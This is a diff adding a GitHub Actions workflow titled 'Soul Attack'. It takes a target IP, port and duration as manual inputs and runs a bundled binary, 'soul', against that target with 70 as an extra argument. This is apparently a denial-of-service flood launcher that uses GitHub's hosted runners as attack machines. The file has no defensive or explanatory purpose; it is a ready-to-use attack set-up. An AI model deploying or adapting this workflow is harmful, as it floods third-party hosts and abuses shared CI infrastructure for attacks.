@@ -1,0 +1,28 @@
+name: Soul Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'IP'
+        required: true
+      port:
+        description: 'Port'
+        required: true
+      time:
+        description: 'Time'
+        required: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Set Permissions
+        run: chmod +x soul
+
+      - name: Run Attack
+        run: ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 70
+        
